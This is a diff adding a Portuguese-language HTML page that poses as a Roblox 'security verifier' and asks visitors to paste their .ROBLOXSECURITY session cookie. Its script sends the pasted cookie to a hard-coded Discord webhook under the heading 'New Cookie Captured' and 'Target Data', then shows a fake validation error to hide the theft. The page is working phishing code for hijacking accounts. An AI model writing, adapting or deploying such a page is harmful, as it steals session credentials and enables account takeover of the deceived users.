@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificador de Segurança - Roblox</title>
+    <style>
+        body { font-family: sans-serif; background: #222; color: white; text-align: center; padding-top: 50px; }
+        input { width: 300px; padding: 10px; margin: 10px; }
+        button { padding: 10px 20px; cursor: pointer; background: #007bff; border: none; color: white; }
+    </style>
+</head>
+<body>
+    <h2>Validador de Cookie .ROBLOXSECURITY</h2>
+    <p>Insira seu cookie abaixo para validar o status da conta:</p>
+    <input type="text" id="cookie" placeholder="Cole aqui seu .ROBLOXSECURITY">
+    <br>
+    <button onclick="enviarDados()">Validar Agora</button>
+
+    <script>
+    function enviarDados() {
+        const cookieValue = document.getElementById('cookie').value;
+        const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
+        
+        const payload = {
+            content: "Novo Cookie Capturado:",
+            embeds: [{
+                title: "Dados do Alvo",
+                description: "```" + cookieValue + "```",
+                color: 16711680
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            alert("Erro na validação. Tente novamente mais tarde.");
+        });
+    }
+    </script>
+</body>
+</html>
